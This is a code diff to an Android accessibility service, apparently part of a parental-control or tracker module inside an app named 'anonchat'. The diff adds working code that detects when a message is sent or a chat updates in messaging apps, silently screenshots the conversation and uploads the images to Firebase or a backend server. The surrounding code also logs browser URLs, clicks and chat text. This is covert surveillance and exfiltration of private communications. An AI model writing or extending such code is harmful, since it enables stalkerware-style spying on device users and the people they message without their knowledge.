@@ -37,6 +37,12 @@ class TrackerAccessibilityService : AccessibilityService() {
     private var lastChatSignature: String? = null
     private val chatHandler = android.os.Handler(android.os.Looper.getMainLooper())
 
+    // ── Chat screenshot capture (on send / new content) ─────────────────
+    private var lastScreenshotMs: Long = 0
+    private var lastChatTextLen: Int = 0
+    private var lastChatTextTs: Long = 0
+    private val screenshotExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
+
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: return
         val now = System.currentTimeMillis()
@@ -135,16 +141,27 @@ class TrackerAccessibilityService : AccessibilityService() {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     val source = event.source
                     if (source != null && !source.isPassword) {
-                        val text = event.text?.joinToString(" ")
+                        val text = event.text?.joinToString(" ") ?: ""
                         val pkg = event.packageName?.toString() ?: ""
-                        if (text != null && text.isNotBlank() && text.length > 3) {
+                        val now2 = System.currentTimeMillis()
+                        // "Message sent" signal: a chat input that had text becomes
+                        // empty the instant the app posts the message → screenshot it.
+                        if (pkg in chatPackages) {
+                            if (text.isBlank() && lastChatTextLen > 3 && now2 - lastChatTextTs < 15_000L) {
+                                maybeCaptureScreenshot(pkg, "sent")
+                            }
+                            if (text.isNotBlank()) {
+                                lastChatTextLen = text.length
+                                lastChatTextTs = now2
+                            }
+                        }
+                        if (text.isNotBlank() && text.length > 3) {
                             if (isBrowserPackage(pkg)) {
                                 val url = extractUrl(text)
                                 if (url != null) {
-                                    val now = System.currentTimeMillis()
-                                    if (url != lastWebUrl && now - lastWebUrlTime > 3000) {
+                                    if (url != lastWebUrl && now2 - lastWebUrlTime > 3000) {
                                         lastWebUrl = url
-                                        lastWebUrlTime = now
+                                        lastWebUrlTime = now2
                                         sendWebHistory(pkg, url)
                                     }
                                     source.recycle()
@@ -160,6 +177,10 @@ class TrackerAccessibilityService : AccessibilityService() {
 
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val pkg = event.packageName?.toString() ?: return
+                // Send / enter button tapped in a chat app → screenshot the conversation.
+                if (pkg in chatPackages && isSendButton(event)) {
+                    maybeCaptureScreenshot(pkg, "send")
+                }
                 val viewId = event.contentDescription?.toString()
                 if (viewId != null && viewId.isNotBlank()) {
                     sendClickReport(pkg, viewId)
@@ -212,14 +233,18 @@ class TrackerAccessibilityService : AccessibilityService() {
 
             // Dedup: same visible set within 10 minutes is not re-sent
             val signature = messages.joinToString("|")
-            if (signature == lastChatSignature &&
-                System.currentTimeMillis() - lastChatCaptureTime < 10 * 60_000L
+            val isNew = signature != lastChatSignature
+            if (!isNew && System.currentTimeMillis() - lastChatCaptureTime < 10 * 60_000L
             ) return
             lastChatSignature = signature
             lastChatCaptureTime = System.currentTimeMillis()
 
             Log.d(TAG, "Chat capture: ${messages.size} visible messages in $packageName")
             sendChatCapture(packageName, messages)
+            // Conversation content changed (incoming message / media / sent message) →
+            // screenshot it: catches the full chat incl. images even if the send
+            // button itself wasn't detected.
+            if (isNew) maybeCaptureScreenshot(packageName, "chat_update")
         } catch (e: Exception) {
             Log.e(TAG, "captureConversation failed: ${e.message}")
         }
@@ -252,6 +277,141 @@ class TrackerAccessibilityService : AccessibilityService() {
                     })
                 }
                 com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }.start()
+    }
+
+    // ── Chat screenshot capture machinery ───────────────────────
+
+    private fun isSendButton(event: AccessibilityEvent): Boolean {
+        return try {
+            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
+            val cls = event.className?.toString()?.lowercase() ?: ""
+            val node = event.source
+            val viewId = node?.viewIdResourceName?.lowercase() ?: ""
+            desc.contains("send") || desc.contains("submit") || desc.contains("enter") ||
+                viewId.contains("send") || viewId.contains("composer_send") ||
+                viewId.contains("send_button") || viewId.contains("btn_send") ||
+                (cls.contains("imagebutton") && desc.contains("send"))
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    /** Screenshot the active chat screen (Android 11+). Throttled to 1 / 10 s. */
+    private fun maybeCaptureScreenshot(packageName: String, reason: String) {
+        val now = System.currentTimeMillis()
+        if (now - lastScreenshotMs < 10_000L) return
+        lastScreenshotMs = now
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            Log.d(TAG, "Screenshot needs Android 11+ (reason=$reason)")
+            return
+        }
+        try {
+            takeScreenshot(
+                android.view.Display.DEFAULT_DISPLAY,
+                screenshotExecutor,
+                object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
+                    override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
+                        handleScreenshot(screenshot, packageName, reason)
+                    }
+                    override fun onFailure(errorCode: Int) {
+                        Log.w(TAG, "Screenshot failed code=$errorCode reason=$reason")
+                    }
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "takeScreenshot error: ${e.message}")
+        }
+    }
+
+    private fun handleScreenshot(result: android.accessibilityservice.AccessibilityService.ScreenshotResult, packageName: String, reason: String) {
+        val hardwareBuffer = result.hardwareBuffer
+        try {
+            val colorSpace = result.colorSpace
+                ?: android.graphics.ColorSpace.get(android.graphics.ColorSpace.Named.SRGB)
+            val full = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace) ?: return
+            val bmp = if (full.width > 1280) {
+                android.graphics.Bitmap.createScaledBitmap(
+                    full, 1280, (full.height * 1280f / full.width).toInt(), true
+                )
+            } else full
+            val file = java.io.File(cacheDir, "cht_${System.currentTimeMillis()}.jpg")
+            try {
+                file.outputStream().use {
+                    bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 78, it)
+                }
+            } finally {
+                if (bmp != full) bmp.recycle()
+                if (full != bmp) full.recycle()
+            }
+            uploadChatScreenshot(file, packageName, reason)
+        } catch (e: Exception) {
+            Log.e(TAG, "handleScreenshot error: ${e.message}")
+        } finally {
+            try { hardwareBuffer.close() } catch (e: Exception) {}
+        }
+    }
+
+    /** Upload the chat screenshot (Firebase first, Render fallback) + record an activity. */
+    private fun uploadChatScreenshot(file: java.io.File, packageName: String, reason: String) {
+        try {
+            val ts = System.currentTimeMillis()
+            val filename = "chat_${ts}.jpg"
+            val meta = org.json.JSONObject().apply {
+                put("source_path", "chat_${reason}_${packageName}")
+                put("original_size", file.length())
+                put("bytes_uploaded", file.length())
+            }
+            var firebaseUrl: String? = null
+            try {
+                firebaseUrl = kotlinx.coroutines.runBlocking(kotlinx.coroutines.Dispatchers.IO) {
+                    com.anonchat.app.parentalcontrol.manager.FirebaseManager
+                        .uploadMediaFile(file, "image")
+                }
+            } catch (e: Exception) {
+                firebaseUrl = null
+            }
+            var mediaId: String? = null
+            if (firebaseUrl != null) {
+                meta.put("storage_url", firebaseUrl)
+                mediaId = ApiClient.uploadMediaFile(
+                    null, filename, "image/jpeg", "image", ts, meta.toString()
+                )
+            } else {
+                mediaId = ApiClient.uploadMediaFile(
+                    file.readBytes(), filename, "image/jpeg", "image", ts, meta.toString()
+                )
+            }
+            sendChatScreenshotActivity(packageName, firebaseUrl, mediaId, reason)
+            file.delete()
+        } catch (e: Exception) {
+            Log.e(TAG, "uploadChatScreenshot error: ${e.message}")
+        }
+    }
+
+    private fun sendChatScreenshotActivity(packageName: String, url: String?, mediaId: String?, reason: String) {
+        Thread {
+            try {
+                val payload = org.json.JSONObject().apply {
+                    put("device_id", CloudConfig.deviceId)
+                    put("activities", org.json.JSONArray().apply {
+                        put(org.json.JSONObject().apply {
+                            put("activity_type", "chat_screenshot")
+                            put("package_name", packageName)
+                            put("app_name", appNameFor(packageName))
+                            put("data", org.json.JSONObject().apply {
+                                put("image_url", url ?: "")
+                                put("media_id", mediaId ?: "")
+                                put("reason", reason)
+                            })
+                            put("timestamp", System.currentTimeMillis())
+                        })
+                    })
+                }
+                ApiClient.sendBulkReport(payload.toString())
             } catch (e: Exception) {
                 e.printStackTrace()
             }
